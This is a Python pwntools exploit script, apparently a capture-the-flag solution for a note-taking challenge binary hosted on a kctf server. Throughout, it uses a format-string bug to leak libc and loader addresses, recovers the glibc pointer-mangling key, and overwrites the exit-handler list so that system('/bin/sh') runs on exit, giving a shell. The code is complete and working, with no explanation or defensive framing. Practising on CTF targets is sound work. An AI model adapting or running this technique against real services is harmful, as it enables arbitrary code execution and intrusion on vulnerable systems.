from pwn import *
from icecream import ic

elf = exe = ELF("./chal_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("takenote.kctf-453514-codelab.kctf.cloud", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *run+619
c
'''.format(**locals())



rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

def encrypt(v, key):
    return rol(v ^ key, 0x11, 64)

def decrypt(encrypted_dl_fini, dl_fini):
    return ror(encrypted_dl_fini, 0x11, 64) ^ dl_fini

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

def add_note(ind, val):
    sla(b"3. Exit\n\n", b"1")
    sla(b"Which note do you want to write to? [0 - 15]\n", str(ind))
    sl(val)

def read_note(ind):
    sla(b"3. Exit\n\n", b"2")
    sla(b"Which note do you want to print?\n", str(ind))
    ru("Your note reads:\n\n")

sla(b"How many notes do you need to write?\n\n", b"16")

add_note(0, b"%13$p")
read_note(0)
libc.address = int(rl(), 16) - libc.sym['setvbuf'] - 261
ic(hex(libc.address))



payload = b'%13$saaa' + p64(libc.address + 0x1ec010)
add_note(1, payload)
read_note(1)
ld.address = uu64(6) - 0x18bc0
ic(hex(ld.address))

dl_fini = ld.address + 0x11d60
initial = libc.address + 0x1edca0

payload = b"%13$saaa" + p64(initial + 0x18)
add_note(2, payload)
read_note(2)
encrypted_dl_fini = uu64(8)

enc = decrypt(encrypted_dl_fini, dl_fini)


enc_system = encrypt(libc.sym['system'], enc)

chunks = [(enc_system >> (i * 16)) & 0xFFFF for i in range(4)] 

for i, chunk in enumerate(chunks):
    payload = fmtstr_payload(12, {initial + 0x18 + (i * 2): chunk}, write_size='short')
    add_note(3 + i, payload) 
    read_note(3 + i)


enc_system = binsh(libc)

chunks = [(enc_system >> (i * 16)) & 0xFFFF for i in range(4)]

for i, chunk in enumerate(chunks):
    payload = fmtstr_payload(12, {initial + 0x20 + (i * 2): chunk}, write_size='short')
    add_note(7 + i, payload)
    read_note(7 + i)

io.interactive()
